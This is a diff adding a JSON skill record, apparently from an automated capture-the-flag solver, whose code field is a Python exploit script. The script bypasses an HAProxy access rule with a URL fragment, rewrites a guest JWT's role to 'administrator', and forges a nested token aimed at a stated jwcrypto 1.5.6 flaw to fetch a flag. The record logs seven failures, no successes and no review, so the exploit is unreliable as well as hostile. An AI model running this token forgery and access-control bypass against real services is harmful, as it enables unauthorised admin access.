@@ -1,0 +1,22 @@
+{
+  "id": "skill-jwt-nested-claim-injection-f47015107ec0f843",
+  "success_count": 0,
+  "fail_count": 7,
+  "created": "2026-07-10T04:00:38Z",
+  "name": "jwcrypto_nested_jwt_bypass",
+  "description": "HAProxy ACL bypass via URL fragment and jwcrypto 1.5.6 nested JWT privilege escalation",
+  "vuln_class": "jwt-nested-claim-injection",
+  "signature": [
+    "aclcbypass",
+    "fragment",
+    "haproxy",
+    "jwcrypto",
+    "nestedjwt",
+    "privilegeescalation"
+  ],
+  "code": "def solve(base_url, session):\n    import re, json, base64\n    \n    def b64url_encode(data):\n        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n    \n    def b64url_decode(data):\n        if isinstance(data, str):\n            data = data.encode()\n        padding = 4 - len(data) % 4\n        if padding != 4:\n            data += b'=' * padding\n        return base64.urlsafe_b64decode(data)\n    \n    # Step 1: Bypass HAProxy ACL using URL fragment (#) to get guest JWT\n    guest_raw = tcp()\n    guest_raw.send(b\"GET /api/v1/get_ticket# HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close\\r\\n\\r\\n\")\n    guest_resp = guest_raw.recvall().decode('utf-8', errors='ignore')\n    \n    json_match = re.search(r'\\{.*\\}', guest_resp, re.DOTALL)\n    if not json_match:\n        return None\n    ticket_data = json.loads(json_match.group())\n    \n    # Extract ticket/token field dynamically\n    guest_token = None\n    for key in ['ticket: ', 'ticket', 'token']:\n        if key in ticket_data:\n            guest_token = ticket_data[key]\n            break\n    if not guest_token:\n        return None\n    \n    # Step 2: Exploit jwcrypto 1.5.6 nested JWT vulnerability\n    parts = guest_token.split('.')\n    if len(parts) != 3:\n        return None\n    \n    header_b64, payload_b64, signature = parts\n    payload = json.loads(b64url_decode(payload_b64))\n    \n    # Elevate to admin role\n    payload['role'] = 'administrator'\n    fake_payload = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())\n    \n    # Craft nested JWT (jwcrypto 1.5.6 bug: accept nested JSON as header)\n    admin_token = '{\" \":\"' + header_b64 + '.' + fake_payload + '.\",\"protected\":\"' + header_b64 + '\",\"payload\":\"' + payload_b64 + '\",\"signature\":\"' + signature + '\"}'\n    \n    # Step 3: Get flag with admin token\n    flag_resp = http('GET', '/api/v1/flag', headers={'Authorization': admin_token})\n    flag_text = flag_resp.text\n    \n    # Extract flag pattern\n    flag_match = re.search(r'HTB\\{[^}]+\\}|flag\\{[^}]+\\}', flag_text, re.IGNORECASE)\n    if flag_match:\n        return flag_match.group(0)\n    \n    # Try JSON responses\n    try:\n        flag_data = json.loads(flag_text)\n        if 'flag' in flag_data:\n            return flag_data['flag']\n        if 'message' in flag_data:\n            html_match = re.search(r'HTB\\{[^}]+\\}|flag\\{[^}]+\\}', flag_data['message'], re.IGNORECASE)\n            if html_match:\n                return html_match.group(0)\n    except:\n        pass\n    \n    return None",
+  "provenance": {
+    "from": "http://127.0.0.1:1337",
+    "reviewed": false
+  }
+}
